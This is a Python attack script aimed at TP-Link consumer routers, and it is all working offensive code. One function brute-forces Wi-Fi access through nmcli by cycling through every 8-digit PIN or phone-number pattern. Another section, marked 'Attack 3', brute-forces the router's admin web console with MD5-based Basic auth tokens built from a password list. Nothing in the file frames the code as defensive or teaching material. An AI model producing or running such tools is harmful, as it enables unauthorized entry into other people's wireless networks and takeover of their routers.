import subprocess
import time
import hashlib
import base64 
import urllib.parse
import requests

def attempt_to_authenticate(ssid: str, pin: str):
    try:
        cmd = ["nmcli", "device", "wifi", "connect", ssid, "password", pin]
        
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
        
        if result.returncode != 0:
            print(f"Connection command failed: {result.stderr.strip()}")
            return False
            
    except subprocess.TimeoutExpired:
        print("Connection timed out at the OS level.")
        return False
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return False

    start_time = time.time()
    while time.time() - start_time < 4:
        try:
            current_ssid = subprocess.check_output(["iwgetid", "-r"], text=True).strip()
            
            if current_ssid == ssid:
                print(f"Successfully connected to {ssid} with pin: {pin}!")
                return True
        except subprocess.CalledProcessError:
            pass
        time.sleep(1)

    print(f"Failed to connect to {ssid} using {pin} within 4 seconds. Moving on...")
    return False

def ssid_brute(ssid: str):
    print("\n" + "═" * 83)
    print("1 — TP-LINK SSID Brute Force   | 2 - Phone Number Brute Force ")
    print("═" * 83 + "\n")

    choice = input("Select an option: ").strip()
    if choice == "1":
        for i in range(99999999):
            pin = f"{i:08d}"
            attempt_to_authenticate(ssid, str(pin))
    elif choice == "2":
        area_code = input("What is the area code?: ").strip()
        for num in range(10000000):
            rest = f"{num:07d}"
            attempt_to_authenticate(ssid, f"{area_code}{rest}")   
    else:
        print("Invalid option")

#Attack 3
def attempt_admin_login(target_url: str , token: str)-> bool:
    session_cookie = {"Authorization": token}
    headers = {
        "Referer" : target_url,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    }
    try:
        response = requests.get(target_url+"userRpm/LoginRpm.htm?Save=Save", cookies=session_cookie, headers=headers, timeout=3)

        if response.status_code == 200 and "httpAutErrorArray" not in response.text:
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")
    return False


def generate_tp_link_auth_token(password: str) -> str:
    password_md5 = hashlib.md5(password.encode('utf-8')).hexdigest()

    credential_string = f"admin:{password_md5}"

    b64_bytes = base64.b64encode(credential_string.encode('utf-8'))
    b64_string = b64_bytes.decode('utf-8')

    token = f"Basic {b64_string}"
    return urllib.parse.quote(token)

def brute_force_login(target_url: str, password_list: list)->None:
    passwords = []
    with open(password_list, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            password = line.strip()
            passwords.append(password)
    print("[*] Attempting Password Brute Force on Admin Console")
    for password in passwords:
        token = generate_tp_link_auth_token(password)
        if attempt_admin_login(target_url, token):
            print(f"[+] Successfully authenticated as Admin with password: [{password}] at: {target_url}.")
            return
        else:
            print(f"[-] Authentication unsuccessful with password: [{password}], trying next password")